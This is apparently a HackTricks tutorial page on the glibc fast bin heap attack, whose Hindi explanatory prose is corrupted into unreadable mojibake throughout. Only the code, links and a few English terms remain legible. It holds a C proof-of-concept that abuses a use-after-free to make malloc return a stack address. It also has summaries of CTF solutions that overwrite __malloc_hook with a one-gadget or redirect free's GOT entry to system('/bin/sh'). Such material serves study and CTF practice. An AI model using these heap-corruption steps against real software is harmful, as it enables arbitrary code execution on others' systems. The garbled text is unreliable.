# Fast Bin Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

рдлрд╛рд╕реНрдЯ рдмрд┐рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВ:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

рдЪреВрдВрдХрд┐ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдПрдХ рд╕рд┐рдВрдЧрд▓реА рд▓рд┐рдВрдХреНрдб рд▓рд┐рд╕реНрдЯ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдиреНрдп рдмрд┐рдиреЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдмрд╣реБрдд рдХрдо рд╣реЛрддреА рд╣реИ рдФрд░ рдмрд╕ **рдПрдХ рдлреНрд░реАрдб рдлрд╛рд╕реНрдЯ рдмрд┐рди** рдЪрдВрдХ рдореЗрдВ рдПрдХ рдкрддреЗ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛** рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рддрд╛рдХрд┐ **рдмрд╛рдж рдореЗрдВ рдХрд┐рд╕реА рднреА рдореЗрдореЛрд░реА рдкрддреЗ рдкрд░ рдПрдХ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

рд╕рд╛рд░рд╛рдВрд╢ рдХреЗ рд░реВрдк рдореЗрдВ: 

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

рдЖрдк рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛рдИ рдЧрдИ рдХреЛрдб рдореЗрдВ рдкреВрд░рд╛ рдЙрджрд╛рд╣рд░рдг [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
рдпрджрд┐ **`global_max_fast`** рдХреЗ рдорд╛рди рдХреЛ рдПрдХ рдмрдбрд╝реЗ рдирдВрдмрд░ рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рддреЛ рдпрд╣ рдмрдбрд╝реЗ рдЖрдХрд╛рд░ рдХреЗ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХреНрд╕ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкрд╣рд▓реЗ рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рдерд╛ред рдпрд╣ рд╕реНрдерд┐рддрд┐ [large bin attack](large-bin-attack.md) рдФрд░ [unsorted bin attack](unsorted-bin-attack.md) рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИред
{% endhint %}

## рдЙрджрд╛рд╣рд░рдг

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* рдЪрдВрдХреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛, рдЙрдиреНрд╣реЗрдВ рдореБрдХреНрдд рдХрд░рдирд╛, рдЙрдирдХреЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝рдирд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рднрд░рдирд╛ (рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рднреЗрджреНрдпрддрд╛ рдХреЗ рд╕рд╛рде) рд╕рдВрднрд╡ рд╣реИред
* **рд╕реВрдЪрдирд╛ рд▓реАрдХ рдХреЗ рд▓рд┐рдП рдЪрдВрдХ рдХреЛ рд╕рдореЗрдХрд┐рдд рдХрд░рдирд╛**: рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдХрд▓реА `prev_size` рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рддрд╛рдХрд┐ рдПрдХ рдкрд┐рдЫрд▓реЗ рдЪрдВрдХреНрд╕ рдХреЛ рдПрдХ рдмрдбрд╝реЗ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдЬрдм рдмрдбрд╝реЗ рдЪрдВрдХреНрд╕ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ рдЪрдВрдХ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛ рдФрд░ libc рдХреЗ рд▓рд┐рдП рдПрдХ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ (`main_arena+88`)ред
* **malloc рд╣реБрдХ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛**: рдЗрд╕рдХреЗ рд▓рд┐рдП, рдФрд░ рдкрд┐рдЫрд▓реЗ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рд╕реНрдерд┐рддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, 2 рдЪрдВрдХреНрд╕ рдХреЛ рдПрдХ рд╣реА рдореЗрдореЛрд░реА рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреЗ рд╣реБрдП рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред рдЗрд╕рд▓рд┐рдП, рджреЛрдиреЛрдВ рдХреЛ рдореБрдХреНрдд рдХрд░рдирд╛ (рд╕реБрд░рдХреНрд╖рд╛рдУрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдмреАрдЪ рдореЗрдВ рдПрдХ рдФрд░ рдЪрдВрдХ рдХреЛ рдореБрдХреНрдд рдХрд░рдирд╛) рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдореЗрдВ рдПрдХ рд╣реА рдЪрдВрдХ 2 рдмрд╛рд░ рд╣реЛред рдлрд┐рд░, рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛, рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреЗ рдкрддреЗ рдХреЛ `__malloc_hook` рд╕реЗ рдереЛрдбрд╝рд╛ рдкрд╣рд▓реЗ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ (рддрд╛рдХрд┐ рдпрд╣ рдПрдХ рдкреВрд░реНрдгрд╛рдВрдХ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗ рдЬрд┐рд╕реЗ malloc рдПрдХ рдореБрдХреНрдд рдЖрдХрд╛рд░ рдорд╛рдирддрд╛ рд╣реИ - рдПрдХ рдФрд░ рдмрд╛рдпрдкрд╛рд╕), рдЗрд╕реЗ рдлрд┐рд░ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдПрдХ рдФрд░ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдирд╛ рдЬреЛ malloc рд╣реБрдХ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред\
рдЕрдВрдд рдореЗрдВ, рд╡рд╣рд╛рдБ рдПрдХ **one gadget** рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдерд╛ред
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* рдПрдХ рд╣реАрдк рдУрд╡рд░рдлреНрд▓реЛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╛рдж рдореБрдХреНрдд рдФрд░ рдбрдмрд▓ рдлреНрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдПрдХ рдЪрдВрдХ рдореБрдХреНрдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдФрд░ рдкреБрдирдГ рдореБрдХреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред
* **Libc рд╕реВрдЪрдирд╛ рд▓реАрдХ**: рдмрд╕ рдХреБрдЫ рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдореБрдЦреНрдп рдПрд░реЗрдирд╛ рд╕реНрдерд╛рди рдХреЗ рдПрдХ рднрд╛рдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрддрд╛ рдорд┐рд▓реЗрдЧрд╛ред рдЪреВрдВрдХрд┐ рдЖрдк рдореБрдХреНрдд рдХрд┐рдП рдЧрдП рдкointers рдХреЛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд╕ рдЗрд╕ рдкрддреЗ рдХреЛ рдкрдврд╝реЗрдВред
* **рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛**: рдЖрд╡рдВрдЯрдиреЛрдВ рдХреЗ рд╕рднреА рдкointers рдПрдХ рдПрд░реЗ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдХреБрдЫ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрддрд┐рдо рдореЗрдВ рдкрддреЗ рдХреЛ рдЗрд╕ рдкointers рдХреЗ рдПрд░реЗ рд╕реЗ рдереЛрдбрд╝рд╛ рдкрд╣рд▓реЗ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, рд╕рдорд╛рди рдЖрдХрд╛рд░ рдХреЗ рдХреБрдЫ рдЪрдВрдХреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ рдФрд░ рд╣рдореЗрдВ рдкрд╣рд▓реЗ рд╡реИрдз рдПрдХ рдорд┐рд▓реЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рдирдХрд▓реА рдПрдХ рдЬреЛ рдкointers рдХреЗ рдПрд░реЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛ред рд╣рдо рдЕрдм рдЗрд╕ рдЖрд╡рдВрдЯрди рдкointers рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ `free` рдХрд╛ GOT рдкрддрд╛ `system` рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░реЗ рдФрд░ рдлрд┐рд░ рдЪрдВрдХ 1 рдореЗрдВ `"/bin/sh"` рд▓рд┐рдЦреЗрдВ рддрд╛рдХрд┐ рдлрд┐рд░ `free(chunk1)` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп `system("/bin/sh")` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдПрдХ рдмрд╛рдЗрдЯ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрдВрдХреНрд╕ рдХреЛ рдЕрд╕рдВрд░рдЪрд┐рдд рдмрд┐рди рдореЗрдВ рд╕рдореЗрдХрд┐рдд рдХрд░рдирд╛ рдФрд░ рдПрдХ libc рд╕реВрдЪрдирд╛ рд▓реАрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ malloc рд╣реБрдХ рдХреЛ рдПрдХ one gadget рдкрддреЗ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ред
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* рдПрдХ рд╕реВрдЪрдирд╛ рд▓реАрдХ рдХреЗ рдмрд╛рдж рдЕрд╕рдВрд░рдЪрд┐рдд рдмрд┐рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП UAF рдХреЗ рд╕рд╛рде libc рдкрддрд╛ рдФрд░ рдПрдХ PIE рдкрддрд╛ рд▓реАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛, рдЗрд╕ CTF рдХрд╛ рд╢реЛрд╖рдг рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрдВрдХ рдХреЛ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЬрд╣рд╛рдБ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЪрдВрдХреНрд╕ рдХреЗ рд▓рд┐рдП рдкointers рд╕реНрдерд┐рдд рдереЗ рддрд╛рдХрд┐ рдХреБрдЫ рдкointers рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХреЗ рдФрд░ GOT рдореЗрдВ рдПрдХ one gadget рд▓рд┐рдЦрдирд╛ред
* рдЖрдк рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛ рдЕрд╕рдВрд░рдЪрд┐рдд рдмрд┐рди рд╣рдорд▓реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
* рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ libc/heap рдкрддреЗ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлреНрд░реА-рд▓рд┐рд╕реНрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ (рдЬрдм рдЖрд╡рд╢реНрдпрдХ рд╣реЛ)ред
* [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
* рд╣рдо рдХреЗрд╡рд▓ `0x100` рд╕реЗ рдмрдбрд╝реЗ рдЖрдХрд╛рд░ рдХреЗ рдЪрдВрдХреНрд╕ рдЖрд╡рдВрдЯрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рдПрдХ рдЕрд╕рдВрд░рдЪрд┐рдд рдмрд┐рди рд╣рдорд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `global_max_fast` рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ (ASLR рдХреЗ рдХрд╛рд░рдг 1/16 рдмрд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ 12 рдмрд┐рдЯреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдореЗрдВ 16 рдмрд┐рдЯреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)ред
* рдЪрдВрдХреНрд╕ рдХреЗ рдПрдХ рд╡реИрд╢реНрд╡рд┐рдХ рдПрд░реЗ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╛рд╕реНрдЯ рдмрд┐рди рд╣рдорд▓рд╛ред рдпрд╣ рдПрдХ рдордирдорд╛рдирд╛ рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХреА рдкреНрд░рд╛рдЗрдорд┐рдЯрд┐рд╡ рджреЗрддрд╛ рд╣реИ, рдЬреЛ GOT рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдХреБрдЫ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ `system` рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
{% endhint %}
